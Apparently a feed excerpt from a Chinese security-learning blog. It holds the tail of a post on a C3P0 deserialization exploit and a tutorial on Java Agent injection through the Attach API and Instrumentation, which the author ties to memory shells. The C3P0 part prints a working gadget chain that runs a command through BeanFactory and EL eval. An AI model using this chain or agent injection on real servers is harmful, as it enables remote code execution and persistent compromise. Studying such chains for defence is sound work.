class="hljs-comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>            <span class="hljs-comment">// 利用表达式执行命令</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>            <span class="hljs-keyword">return</span> ref;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//序列化流写入文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241203210853776.png" alt="image-20241203210853776"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;c3p0介绍&quot;&gt;&lt;a href=&quot;#C3P0介绍&quot; class=&quot;headerlink&quot; title=&quot;C3P0介绍&quot;&gt;&lt;/a&gt;C3P0介绍&lt;/h1&gt;&lt;p&gt;C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java Agent学习</title>
    <link href="https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-30T12:41:16.000Z</published>
    <updated>2024-11-13T03:04:14.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java-agent介绍"><a href="#Java-Agent介绍" class="headerlink" title="Java Agent介绍"></a>Java Agent介绍</h1><p>官方文档：<a href="https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html">https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html</a></p><p>java agent就是一种能够在不影响正常编译的情况下，修改java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。也就是平时所说的插桩技术，平常的热部署、诊断工具都是基于Java Agent技术来实现的。该技术从JDK1.5开始引入。</p><h1 id="java-agent使用"><a href="#Java-Agent使用" class="headerlink" title="Java Agent使用"></a>Java Agent使用</h1><p>Java Agent分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动后加载的agentmain-Agent，有点类似特殊的拦截器的样子。</p><h2 id="premain-agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h2><p>实现该Agent首先我们必须实现一个静态premain方法，同时我们jar文件的清单(mainfest)中必须要有Premain-Class属性，也就是jar包中常见到的MF文件，这从官方文档中可以得知</p><p><img src="https://cdn.clown2024.cn/image-20241030211341318.png" alt="image-20241030211341318"></p><p>可以知道，就是在执行main方法前执行我们的premain方法，执行的类就是我们Premain-Class属性的值</p><p>现在来实现一个简单的premain-Agent，先正常maven创建一个普通的项目</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">premainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            System.out.printf(<span class="hljs-string">&quot;调用了JavaAgent%d次\n&quot;</span>,i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着在 <code>resources/META-INF/</code> 下创建 <code>MANIFEST.MF</code> 清单文件用以指定 <code>premain-Agent</code> 的启动类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Premain-Class: org.example.Agent.premainAgent<br><br></code></pre></td></tr></table></figure><blockquote><p>要注意该文件最后一定要多一个换行，不然会爆红</p></blockquote><p>目前的目录结构如下：</p><p><img src="https://cdn.clown2024.cn/image-20241030213350306.png" alt="image-20241030213350306"></p><p>然后我们将该文件打成jar包，这里记录两种打包方式</p><p><strong>用jar命令打包</strong></p><p>打包前我们需要将java文件替换成我们编译好的class文件，因为jar命令就只是将文件打包成一个jar，并不会进行编译，而jar包的文件想要被JVM识别就需要是class文件</p><p>然后对src目录的所有文件打包</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">CTF</span>\<span class="hljs-title">Java</span>\<span class="hljs-title">JavaCode</span>\<span class="hljs-title">JavaAgent</span>\<span class="hljs-title">src</span>\<span class="hljs-title">main</span>&gt;<span class="hljs-title">jar</span> <span class="hljs-title">cvfm</span> ..\..\<span class="hljs-title">agent.jar</span> <span class="hljs-title">resources</span>/<span class="hljs-title">META</span>-<span class="hljs-title">INF</span>/<span class="hljs-title">MANIFEST.MF</span> ..\..\<span class="hljs-title">src</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220310229.png" alt="image-20241030220310229"></p><p><img src="https://cdn.clown2024.cn/image-20241030220348113.png" alt="image-20241030220348113"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">参数说明：<br>c：创建新的 JAR 文件。<br>v：生成详细输出，以便查看正在执行的操作。<br>f：指定 JAR 文件的名称。<br>m：指定 MANIFEST.MF 文件的位置。<br></code></pre></td></tr></table></figure><p>然后就能看到我们的agent.jar包了，我看文章也可以直接指定单一class文件打成jar包，例如这样</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">jar cvfm ..\..\agent1.jar resources/META-INF/MANIFEST.MF java\org\example\Agent\<br>premainAgent.class<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220652347.png" alt="image-20241030220652347"></p><p>这种打包方式会自动给你创建必要的包路径，对比了一下两种打包方式，目录结构如下</p><p><img src="https://cdn.clown2024.cn/image-20241030220817921.png" alt="image-20241030220817921"></p><p>指定class文件打包的就是直接从java包开始创建，只创建寻找类的必要的包</p><p><img src="https://cdn.clown2024.cn/image-20241030220900229.png" alt="image-20241030220900229"></p><p>而指定目录的方式就会从我们指定的目录开始打包，都会包括进去</p><p>顺便也记录一下有关jar会用的上的其他命令：</p><ul><li><p>检查jar文件内容：jar tvf agent.jar</p><p><img src="https://cdn.clown2024.cn/image-20241030221232096.png" alt="image-20241030221232096"></p></li></ul><p><strong>使用idea打包</strong></p><p>这种方式不需要提前编译，他在build的时候就会帮我们编译</p><p>我们选择选择<code>Project Structure</code> -&gt; <code>Artifacts</code> -&gt; <code>JAR</code> -&gt; <code>From modules with dependencies</code></p><p><img src="https://cdn.clown2024.cn/image-20241030221418303.png" alt="image-20241030221418303"></p><p><img src="https://cdn.clown2024.cn/image-20241030221442499.png" alt="image-20241030221442499"></p><p><img src="https://cdn.clown2024.cn/image-20241030221521466.png" alt="image-20241030221521466"></p><p>然后选择选择<code>Build</code> -&gt; <code>Build Artifacts</code> -&gt; <code>Build</code></p><p>然后就可以在out目录看到我们生成的jar包了</p><p><img src="https://cdn.clown2024.cn/image-20241030221714027.png" alt="image-20241030221714027"></p><p>现在我们的agent类已经创建好了，我们需要再创建一个新的目标类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样使用MF来打包，创建一个MF文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Main-Class: org.example.Main<br><br></code></pre></td></tr></table></figure><p>然后打成jar包</p><p>现在我们就得到两个jar包</p><p><img src="https://cdn.clown2024.cn/image-20241030222419726.png" alt="image-20241030222419726"></p><p>然后我们只要添加一个参数就能应用agent.jar包，格式在官方文档也有，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-javaagent:&lt;jarpath&gt;[=&lt;options&gt;]<br># options是传递给代理的参数，premain的agentArgs字段就是用来接受参数的<br></code></pre></td></tr></table></figure><p>现在执行下面命令运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -javaagent:agent.jar -jar TestAgent.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030223732827.png" alt="image-20241030223732827"></p><h2 id="agentmain-agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h2><p>agentmain-Agent就是能够在JVM启动后加载并修改字节码</p><p>编写该类需要实现agentmain方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样写一个MF文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br><br></code></pre></td></tr></table></figure><p>然后写一个一直运行的目标类方便观察结果</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是agentmain就不是通过命令行指定参数的形式启动了，官方为了实现启动后加载，提供了<code>Attach API</code>。Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code>包里面。</p><p>这两个类为<code>com.sun.tools.attach.VirtualMachine</code>类和<code>com.sun.tools.attach.VirtualMachineDescriptor</code>类</p><blockquote><p>这两个类在tools.jar包中，可能要手动添加一下jar包，因为我在jdk8u65测试的时候他没有自动引入</p><p><img src="https://cdn.clown2024.cn/image-20241030232514951.png" alt="image-20241030232514951"></p></blockquote><h3 id="virtualmachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h3><p>该类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>我们可以通过给该类的attach方法传入一个JVM的PID，然后远程连接到该JVM上，之后就可以对该JVM及进行操作，比如注入agent就是以这种形式</p><p>下面是该类的主要方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//允许我们传入一个JVM的PID，然后远程连接到该JVM上<br>VirtualMachine.attach()<br> <br>//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理<br>VirtualMachine.loadAgent()<br> <br>//获得当前所有的JVM列表<br>VirtualMachine.list()<br> <br>//解除与特定JVM的连接<br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure><p>使用其中一个方法试试</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030234554068.png" alt="image-20241030234554068"></p><h3 id="virtualmachinedescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h3><p>该类就是一个描述特定虚拟机的类，从前面list方法获取的返回值也能知道，他就代表一个虚拟机，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。</p><p>我们可以测试一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>            System.out.println(virtualMachineDescriptor.displayName());<br>            System.out.println(virtualMachineDescriptor.id());<span class="hljs-comment">//打印PID</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030235436825.png" alt="image-20241030235436825"></p><h3 id="注入agent"><a href="#注入agent" class="headerlink" title="注入agent"></a>注入agent</h3><p>现在知道了这两个类我们就可以进行注入了</p><p>同样的我们前面的agent要打成jar包，然后我们还要写一个inject类用于注入</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后先将目标类运行起来，一段时间后开启我们的inject类</p><p><img src="https://cdn.clown2024.cn/image-20241031000148056.png" alt="image-20241031000148056"></p><p>可以看到成功注入目标类中</p><h1 id="instrumentation实例"><a href="#Instrumentation实例" class="headerlink" title="Instrumentation实例"></a>Instrumentation实例</h1><h2 id="instrumentation介绍"><a href="#Instrumentation介绍" class="headerlink" title="Instrumentation介绍"></a>Instrumentation介绍</h2><p>在实现agent的方法的时候，我们发现除了参数的接受，他还有另一个Instrumentation类型的参数，该类在java.lang.instrument包下，那么什么是Instrumentation呢</p><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p>Instrumentation是一个接口，其常用方法如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类，相当于重新加载使我们的修改生效</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br> <br>    <span class="hljs-comment">//判断一个类是否能被修改</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// 获取目标所有已经加载的类。</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br> <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="instrumentation使用"><a href="#Instrumentation使用" class="headerlink" title="Instrumentation使用"></a>Instrumentation使用</h2><p>我们修改一下前面的agentMain来试一试Instrumentation的功能，我们给目标类添加一个ClassFileTransformer类转换器</p><p>ClassFileTransformer接口下只有一个transform方法，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。</p><p>目标类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            Hello();<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是改一下我们的agentMain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//获取所有已加载的类</span><br>        <span class="hljs-comment">//获取目标JVM加载的全部类</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>))&#123;<br><br>                <span class="hljs-comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是我们的ClassFileTransformer，这里用javassist来修改类</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span 